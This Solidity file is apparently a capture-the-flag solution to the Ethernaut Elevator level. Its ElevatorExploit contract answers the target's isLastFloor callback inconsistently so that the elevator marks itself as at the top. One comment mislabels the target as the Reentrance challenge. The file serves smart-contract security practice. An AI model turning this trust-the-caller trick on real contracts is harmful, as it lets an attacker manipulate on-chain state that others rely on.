// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function top() external view returns (bool);

    function goTo(uint256 _floor) external;
}

contract ElevatorExploit is Building {
    uint256 floor;
    IElevator public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Reentrance` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251
    constructor(IElevator _implementation) {
        implementation = _implementation;
    }

    /// @notice Uses cached floor value to reach the top of building on second call
    function isLastFloor(uint256 _floor)
        external
        override
        returns (bool isTop)
    {
        isTop = floor == _floor;
        floor = _floor;
    }

    /// @notice Allows the elevator to reach top
    function exploit() external {
        implementation.goTo(10); // arbitrary number xD
    }

    /// @notice Returns a boolean wheter the `implementation` contract has reached top
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.top();
    }
}
